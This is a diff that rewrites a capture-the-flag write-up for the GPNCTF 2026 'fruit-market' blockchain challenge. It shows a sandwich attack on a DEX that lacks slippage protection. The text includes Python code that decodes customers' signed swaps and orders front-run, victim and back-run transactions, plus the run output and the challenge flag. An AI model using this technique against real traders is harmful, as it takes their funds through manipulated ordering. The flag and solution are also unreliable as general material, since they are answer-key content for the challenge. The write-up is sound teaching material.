@@ -1,35 +1,53 @@
-# fruit-market
+# Fruit Market
 
-- **CTF:** GPNCTF 2026
-- **Category:** Misc (it's a blockchain chall wearing a Misc trenchcoat)
+## Challenge info
+
+- **Name:** fruit-market
+- **Event:** GPNCTF 2026
+- **Category:** Misc / Blockchain
 - **Author:** tamedfox
-- **Flag:** `GPNCTF{l0ok_M4m4_1_GO7_s0m3_fruI75_At_My_joB}`
 
-> We are hiring a trade transaction coordinator (m/f/x) for our bleeding-edge fruit market — our blockchain market place enables the fastest and safest way for trading fruits in town! As our trade transaction coordinator, you take trades from our customers and execute them on-chain before they expire. Your neutrality towards all customers makes our market the ultimate choice for all professional fruit dealers.
+The challenge presents itself as a fruit-trading job.
 
-That last sentence is the whole challenge, by the way. Hold that thought.
+We are hired as a transaction coordinator for a blockchain marketplace and are responsible for submitting customer trades before they expire.
 
-## TL;DR
+The important part is that we are not just observing the transaction flow. We control which transactions reach the chain and in what order.
 
-You're the guy who decides the order transactions hit the chain (you *are* the mempool), the customer bots broadcast their signed swaps to you in advance, and the DEX has zero slippage protection. So you sandwich every customer who sells apples, compound the proceeds, and walk 10 🍎 up to 500 🍎. Job's a good'un.
+That makes the coordinator role a perfect setup for a sandwich attack.
 
-## What's in the box
+## First look
 
-The takeout tarball has three relevant chunks:
+The provided files contain three main components:
 
-- `eth/MiniDex.sol` + `eth/ERCFixed.sol` — a constant-product AMM and a vanilla OpenZeppelin ERC20.
-- `python/{main,trader,utils}.py` — a Flask app that spins up an `anvil` node, deploys everything, and runs three trading bots.
-- `html/` — the operator panel (Bootstrap + Socket.IO). Mostly a distraction, but it does confirm the intended flow.
+- `eth/MiniDex.sol` and `eth/ERCFixed.sol`
+- `python/main.py`, `python/trader.py`, and `python/utils.py`
+- a small HTML operator panel using Bootstrap and Socket.IO
 
-Three fruit tokens — APL 🍎, BAN 🍌, CHY 🍒 — each minting **1000** base units (note: no decimals scaling in play, everything is tiny integers, which matters later). Three pools:
+The blockchain setup contains three ERC-20 tokens:
 
+```text
+APL  apples
+BAN  bananas
+CHY  cherries
 ```
-APL-BAN : 100 APL / 200 BAN
-BAN-CHY : 100 BAN / 200 CHY
-APL-CHY : 100 APL / 400 CHY
+
+Each token has a total supply of 1000 base units.
+
+There is no decimal scaling involved, so every balance and swap amount is a small integer. That becomes useful later because we can brute-force the best trade size very cheaply.
+
+The three liquidity pools begin with:
+
+```text
+APL-BAN: 100 APL / 200 BAN
+BAN-CHY: 100 BAN / 200 CHY
+APL-CHY: 100 APL / 400 CHY
 ```
 
-Three customer bots (`Trader`) seeded with apples/bananas/cherries. Their strategy, verbatim from `trader.py`:
+The application also launches three automated traders.
+
+## Bot behavior
+
+The trading strategy is defined in `trader.py`:
 
 ```python
 # Ultimate Trading Strategy:
@@ -39,156 +57,422 @@ trade_token = max(balance, key=balance.get)
 trade_amount = max(int(balance[trade_token] * 0.5), 1)
 ```
 
-So they dump half of whatever they're heaviest in. Bot A starts with 400 APL, i.e. it's gonna be selling apples for a while. File that away.
+Each bot finds the token it currently owns the most of and sells half of that balance.
 
-The win condition, from `main.py`:
+One bot begins with 400 APL, which means it will repeatedly submit large apple sales.
+
+That is especially useful because the win condition requires us to accumulate apples.
+
+## Win condition
+
+The `/flag` endpoint checks the manager's APL balance:
 
 ```python
 @app.get("/flag")
 def flag():
-    if balance_erc(ETH_SETUP['ercs']['APL'], MANAGER) >= 500:
-        return "Wow! Here is your flag:\n" + os.environ.get('FLAG', ...)
+    if balance_erc(ETH_SETUP["ercs"]["APL"], MANAGER) >= 500:
+        return "Wow! Here is your flag:\n" + os.environ.get("FLAG", ...)
 ```
 
-500 APL. There are only 1000 in existence — 790 across the bots, 200 in pools, 10 left over (which the fruit basket hands to you). So "earn" half the apple supply.
+We need at least:
 
-## The endpoints
+```text
+500 APL
+```
 
-- `GET /setup` — token + dex addresses.
-- `POST /fruit-basket` — registers your address as `MANAGER` and gives you 10 APL + a pile of ETH. **One-shot**, globally. Call it twice and you get `403 already claimed`.
-- `GET /open` — starts the bot worker thread.
-- `POST /submit` — takes a raw signed tx and `send_raw_transaction`s it. This is how trades reach the chain.
-- `POST /` — a JSON-RPC proxy, but with an allowlist (`SAFE_METHODS`): only read methods. `eth_sendRawTransaction` is **not** in it.
-- `socket.io` `new_trade` — each bot's `(approve, swap, swap_hash)` gets emitted to every connected client.
+There are only 1000 apples in total.
 
-And here's the thing the worker actually does:
+The initial distribution leaves the manager with 10 APL after claiming the fruit basket, so the goal is to turn those 10 apples into at least 500.
+
+## Application endpoints
+
+The important endpoints are:
+
+```text
+GET  /setup
+POST /fruit-basket
+GET  /open
+POST /submit
+POST /
+```
+
+Their roles are:
+
+- `/setup` returns the deployed contract addresses.
+- `/fruit-basket` registers our address as the manager and transfers 10 APL plus ETH.
+- `/open` starts the customer bot worker.
+- `/submit` accepts a signed raw transaction and broadcasts it.
+- `/` acts as a restricted JSON-RPC proxy for read-only methods.
+
+The RPC proxy allows methods such as `eth_call`, balance queries, nonce queries, and gas price lookups.
+
+It does not allow:
+
+```text
+eth_sendRawTransaction
+```
+
+All state-changing transactions must be sent through `/submit`.
+
+## The critical design flaw
+
+The bot worker creates signed transactions and emits them over Socket.IO:
 
 ```python
 txs = t.next()
 if txs is not None:
-    socketio.emit('new_trade', { 'approve': ..., 'swap': ..., 'swap_hash': ... })
+    socketio.emit(
+        "new_trade",
+        {
+            "approve": ...,
+            "swap": ...,
+            "swap_hash": ...,
+        },
+    )
 ```
 
-It **emits** the signed transactions. It does not submit them. Nobody submits them but you. The chain literally does not move unless the coordinator (you) relays the bytes through `/submit`.
+The worker does not submit those transactions itself.
 
-So you have:
-1. full advance knowledge of every trade, signed and ready,
-2. total control over ordering and inclusion,
-3. and the ability to inject your own transactions wherever you like.
+It only sends the signed bytes to every connected client.
 
-That's not a mempool with an MEV problem. That's *being* the MEV.
+The coordinator is expected to relay them through `/submit`.
 
-## Dead ends I burned an hour on first
+That means we have:
 
-Because of course I didn't see it immediately.
+- the customer's fully signed transaction before execution
+- full control over whether it is included
+- full control over its position relative to our own transactions
+- the ability to inject our own trades before and after it
 
-**Reentrancy.** `MiniDex` extends `ReentrancyGuard` and `swap` is `nonReentrant`. The tokens are stock OZ ERC20 with no transfer hooks. There's no callback surface. Nope.
+The coordinator effectively controls the mempool and block ordering.
 
-**Replaying the bots' signed txs.** You get their fully-signed `approve`+`swap` over the socket — can you just... resubmit them for profit? No. They're bound to the bot's nonce and `msg.sender`; `transferFrom` pulls *their* tokens to *them*. Replaying just re-runs their own trade. Useless to me.
+The challenge description mentions that our neutrality makes the marketplace safe. Nothing in the application actually enforces that neutrality.
 
-**Abusing the RPC proxy.** I really wanted `anvil_setBalance` (it's used in `utils.give_money`) or a raw `eth_sendRawTransaction` through `POST /`. Both blocked — `SAFE_METHODS` is read-only. You're forced through `/submit` for any state change, which (annoyingly at first, then beautifully) is the whole point.
+## Dead ends
 
-**The rounding bug, solo.** This one's real and worth describing because it almost looks like the intended path. `getAmountOut` does:
+Before recognizing the transaction-ordering attack, I tested several other ideas.
+
+### Reentrancy
+
+`MiniDex` inherits from `ReentrancyGuard`, and the swap function is marked `nonReentrant`.
+
+The tokens are normal OpenZeppelin ERC-20 implementations without transfer hooks or callbacks.
+
+There was no useful reentrancy surface.
+
+### Replaying customer transactions
+
+The application broadcasts each customer's signed approval and swap transactions.
+
+Replaying them does not redirect any assets to us.
+
+The transactions are tied to the customer's address and nonce, and the DEX transfers assets on behalf of that same customer.
+
+Resubmitting them only performs the customer's intended trade.
+
+### Abusing the RPC proxy
+
+The setup uses Anvil internally, so methods such as `anvil_setBalance` would have been useful.
+
+However, the JSON-RPC proxy has a strict read-only allowlist.
+
+Both `anvil_setBalance` and `eth_sendRawTransaction` are blocked.
+
+### AMM rounding
+
+The DEX output formula is:
 
 ```solidity
-uint256 newOutputReserve = (inputReserve * outputReserve) / newInputReserve; // floor
-outputAmount = outputReserve - newOutputReserve;
+uint256 newOutputReserve =
+    (inputReserve * outputReserve) / newInputReserve;
+
+outputAmount =
+    outputReserve - newOutputReserve;
 ```
 
-Flooring `newOutputReserve` *before* subtracting means the output is rounded **up** in the trader's favor — there's no fee to absorb it, so `k` actually shrinks on every swap. A round trip on APL-CHY:
+Because the division is rounded down before subtraction, the final output is effectively rounded upward in the trader's favor.
 
-```
-swap 10 APL -> 37 CHY    (pool 100/400 -> 110/363)
-swap 37 CHY -> 11 APL    (pool 110/363 -> 99/400)
-```
+For example, in the APL-CHY pool:
 
-You put in 10 APL, you get out 11. Free apple, every loop, no bots required. Cute! But the APL-CHY pool only holds 100 apples and the gain is ~1 per loop and it tapers as you drain it. You are not grinding to 500 apples one rounding error at a time before the heat death of the universe. Dead path — but it's the same no-fee/no-protection sloppiness that makes the real attack work, so it's a good tell.
-
-## The actual bug
-
-`swap` has a deadline and a `require(outputAmount > 0)`. That's it. **No `minAmountOut`.** No slippage protection whatsoever.
-
-Combine that with "you control ordering and see trades in advance" and you've got the cleanest sandwich setup imaginable. For any bot that's *selling APL* into a pool:
-
-1. **Front-run** — sell all *your* APL into that pool first. Tanks the APL price.
-2. **Relay the victim** — their APL→token swap executes at the garbage price you just created. They have no `minOut` to bail them out, so they eat it. The pool fills with cheap apples.
-3. **Back-run** — sell everything back. You scoop the underpriced apples.
-
-Their slippage is your profit, denominated in apples, which is exactly the token you need. And it compounds, because next round your front-run is bigger.
-
-The "your neutrality towards all customers" line in the description is the author straight-up telling you the assumption — and that nothing enforces it.
-
-### Does the math actually reach 500?
-
-I reimplemented `getAmountOut` in plain Python (it's just integer arithmetic) and ran the whole thing — three pools, three bots on their real strategy, me sandwiching every APL sale with an optimal front-run size. One sandwich of the first 200-APL dump:
-
-```
-pool 100/400, I hold 10 APL
-front-run 10 APL -> 37 CHY     pool 110/363
-victim 200 APL -> 235 CHY      pool 310/128
-back-run 37 CHY -> 70 APL      pool 240/165
-=> 10 APL became 70 APL
+```text
+10 APL -> 37 CHY
+37 CHY -> 11 APL
 ```
 
-From there it snowballs. The sim hit 500+ in ~4 sandwiched apple-sales. Because the pool only changes when *I* submit, there's no race at all: I can read live reserves via the proxy, brute-force the front-run amount that maximizes my final APL, then fire. Deterministic.
+A round trip gains one apple.
 
-## The script
+This is a real flaw, especially because the DEX charges no fee, but it is not enough to reach 500 APL efficiently. The pool only begins with 100 apples, and the gain becomes less useful as the reserves change.
 
-A few practical notes that bit me:
+The rounding issue was a good clue that the AMM lacked several normal protections, but it was not the main exploit.
 
-- **Reads** go through the proxy (`web3` pointed at `POST /` — `eth_call`, `eth_getTransactionCount`, `eth_gasPrice`, etc. are all allowlisted). **Writes** get signed locally and shipped via `POST /submit`. Don't try to `send_raw_transaction` through web3; it's not in `SAFE_METHODS`.
-- Pre-approve every dex to spend both your tokens once at the start (max allowance), so each swap is a single tx and the ordering stays tidy.
-- The bots' emitted hex has no `0x` prefix; `recover_transaction` doesn't care, but strip/normalize anyway.
-- Decode the victim's `swap` to learn `(amount, inputToken)`. I just RLP-decode the raw tx myself: for an EIP-2718 typed envelope, `to = fields[5]`, `data = fields[7]`; calldata is `selector(4) || amount(32) || token(32) || deadline(32)`. `swap(uint256,address,uint256)` selector is `0x43264349`.
-- Guard the socket handler with a lock so sandwiches don't interleave and scramble your nonces.
+## The actual vulnerability
 
-Core of it:
+The DEX swap function checks a deadline and requires a nonzero output.
+
+It does not accept a minimum output amount.
+
+There is no equivalent of:
+
+```solidity
+require(outputAmount >= minAmountOut);
+```
+
+So customer trades have no slippage protection.
+
+This becomes exploitable because we know every trade in advance and control the ordering.
+
+Whenever a customer sells APL, we can perform a sandwich:
+
+1. Sell our APL into the same pool first.
+2. Submit the customer's APL sale.
+3. Sell the token received in step one back into the pool.
+
+The first trade changes the reserves and pushes down the price of APL.
+
+The customer's transaction then executes at a much worse rate, but it cannot revert because it does not specify a minimum acceptable output.
+
+The customer's sale adds a large amount of cheap APL to the pool.
+
+Our final trade buys those apples back.
+
+The customer's slippage becomes our profit.
+
+## Example sandwich
+
+Suppose the APL-CHY pool begins at:
+
+```text
+100 APL / 400 CHY
+```
+
+We hold 10 APL, and the customer is about to sell 200 APL.
+
+### Front-run
+
+We sell 10 APL:
+
+```text
+10 APL -> 37 CHY
+```
+
+The reserves become approximately:
+
+```text
+110 APL / 363 CHY
+```
+
+### Customer trade
+
+The customer sells 200 APL:
+
+```text
+200 APL -> 235 CHY
+```
+
+The pool becomes:
+
+```text
+310 APL / 128 CHY
+```
+
+### Back-run
+
+We sell our 37 CHY back:
+
+```text
+37 CHY -> 70 APL
+```
+
+Our balance changes from:
+
+```text
+10 APL
+```
+
+to:
+
+```text
+70 APL
+```
+
+That is a 60-apple profit from a single customer trade.
+
+The attack compounds because the next sandwich can use the larger APL balance.
+
+## Choosing the front-run amount
+
+Since all balances are small integers, I reproduced the DEX formula in Python.
+
+For each customer APL sale, I tested every possible front-run size from zero through my current APL balance.
+
+For each candidate, the simulation performed:
+
+1. my APL sale
+2. the customer's APL sale
+3. my reverse trade
+
+The candidate that left me with the most APL was selected.
+
+This is fast enough to do live because the search range is tiny.
+
+It also prevents accidentally taking an unprofitable sandwich when a pool becomes too shallow.
+
+## Decoding customer transactions
+
+The Socket.IO event includes the customer's signed approval and swap transactions.
+
+To identify which trades should be sandwiched, I decoded the raw swap transaction.
+
+The target function is:
+
+```solidity
+swap(uint256,address,uint256)
+```
+
+with selector:
+
+```text
+0x43264349
+```
+
+The calldata layout is:
+
+```text
+4 bytes   function selector
+32 bytes  input amount
+32 bytes  input token address
+32 bytes  deadline
+```
+
+For typed Ethereum transactions, I RLP-decoded the envelope and extracted:
+
+```text
+to   = fields[5]
+data = fields[7]
+```
+
+Then I parsed the amount and input token from the calldata.
+
+If the input token was not APL, I simply relayed the customer's approval and swap.
+
+If the input token was APL, I performed the sandwich.
+
+## Transaction flow
+
+The core handler looked roughly like this:
 
 ```python
 def handle_trade(payload):
     to, data = decode_to_data(payload["swap"])
-    if data[:4] != SWAP_SELECTOR: return
-    in_amt   = int.from_bytes(data[4:36], "big")
-    in_token = Web3.to_checksum_address(data[36:68][-20:])
 
-    if in_token != APL:
-        submit(payload["approve"]); submit(payload["swap"])   # stay "neutral", relay it
+    if data[:4] != SWAP_SELECTOR:
         return
 
-    # APL is being sold into pool `d` -> sandwich
-    rA, rB = dex[d].functions.getReserves().call()
-    apl_res, tgt_res = (rA, rB) if token_a == APL else (rB, rA)
-    f, _ = best_frontrun(apl_res, tgt_res, in_amt, apl_balance())   # search 0..myAPL
+    input_amount = int.from_bytes(data[4:36], "big")
+    input_token = Web3.to_checksum_address(
+        data[36:68][-20:]
+    )
 
-    if f: send_my_call(dex[d], "swap", [f, APL, FAR], 200_000)      # 1. front-run
-    submit(payload["approve"]); submit(payload["swap"])             # 2. victim
-    tgt = bal(target)
-    if tgt: send_my_call(dex[d], "swap", [tgt, target, FAR], 200_000)  # 3. back-run
+    if input_token != APL:
+        submit(payload["approve"])
+        submit(payload["swap"])
+        return
+
+    reserve_a, reserve_b = (
+        dex.functions.getReserves().call()
+    )
+
+    apl_reserve, target_reserve = (
+        (reserve_a, reserve_b)
+        if token_a == APL
+        else (reserve_b, reserve_a)
+    )
+
+    front_amount, _ = best_frontrun(
+        apl_reserve,
+        target_reserve,
+        input_amount,
+        apl_balance(),
+    )
+
+    if front_amount:
+        send_my_call(
+            dex,
+            "swap",
+            [front_amount, APL, FAR],
+            200_000,
+        )
+
+    submit(payload["approve"])
+    submit(payload["swap"])
+
+    target_balance = balance(target_token)
+
+    if target_balance:
+        send_my_call(
+            dex,
+            "swap",
+            [target_balance, target_token, FAR],
+            200_000,
+        )
+
     try_flag()
 ```
 
-`best_frontrun` just simulates the three-leg sandwich for every front-run size from 0 to my current APL and picks the one that leaves me richest — since amounts are tiny ints, the brute force is instant and guarantees I never accidentally take a loss when the pool's too shallow.
+A lock around the Socket.IO handler was also important so that two incoming trades could not interleave and break our nonce ordering.
 
-## Run
+## Practical details
 
+Several implementation details mattered:
+
+- Read-only Web3 calls went through the JSON-RPC proxy.
+- Signed write transactions were sent through `/submit`.
+- I pre-approved every DEX to spend both relevant tokens.
+- Bot transaction hex strings needed normalization because they did not always include a `0x` prefix.
+- The customer approval had to be submitted before the customer's swap.
+- My own transaction nonces had to remain strictly ordered.
+
+## Result
+
+The APL balance grew quickly:
+
+```text
+Starting balance: 10 APL
+
+200 APL customer sale -> 70 APL
+150 APL customer sale -> 206 APL
+160 APL customer sale -> 362 APL
+ 75 APL customer sale -> 436 APL
+ 80 APL customer sale -> 518 APL
 ```
-$ python3 live.py https://...gpn24.ctf.kitctf.de
-[*] manager  : 0x5CC5F37a...
-[*] fruit-basket: 200 'OK'
-[*] starting APL balance: 10
-[trade] victim sells 200 APL ...  =>  my APL = 70
-[trade] victim sells 150 APL ...  =>  my APL = 206
-[trade] victim sells 160 APL ...  =>  my APL = 362
-[trade] victim sells  75 APL ...  =>  my APL = 436
-[trade] victim sells  80 APL ...  =>  my APL = 518
-============================================================
-[+] Wow! Here is your flag:
+
+After five sandwiches, the manager held more than the required 500 apples.
+
+The `/flag` endpoint returned:
+
+```text
+Wow! Here is your flag:
 GPNCTF{l0ok_M4m4_1_GO7_s0m3_fruI75_At_My_joB}
-============================================================
 ```
 
-Five sandwiches, 10 → 518. Bot A obligingly kept dumping apples right into the wood chipper.
+## Flag
 
-## Takeaway
+```text
+GPNCTF{l0ok_M4m4_1_GO7_s0m3_fruI75_At_My_joB}
+```
 
-The bug isn't in any one line of Solidity — `MiniDex` is just a slightly-sloppy textbook AMM. The bug is the *trust model*: a swap with no `minAmountOut` is safe only if the party choosing transaction order is honest, and this challenge hands that role to the attacker and then writes "your neutrality is what makes us great" on the wall. Real MEV is exactly this, minus the fruit emojis. Add slippage protection and the whole thing falls apart — your front-run would push the price past the customer's `minOut` and their swap would revert instead of feeding you.
+## Final thoughts
+
+This was a very nice MEV challenge disguised as a miscellaneous task.
+
+The Solidity contract does not contain one dramatic bug. The real weakness comes from combining three design choices:
+
+- customers reveal signed trades before execution
+- the coordinator controls inclusion and ordering
+- swaps have no minimum output protection
+
+Any one of those might be acceptable in a different trust model. Together, they give the coordinator complete control over customer slippage.
+
+The challenge description even points directly at the broken assumption by emphasizing the coordinator's neutrality.
+
+In a real DEX, a customer would provide a `minAmountOut` based on their acceptable slippage. A front-run that moved the price too far would then cause the customer's swap to revert instead of handing the attacker a guaranteed profit.
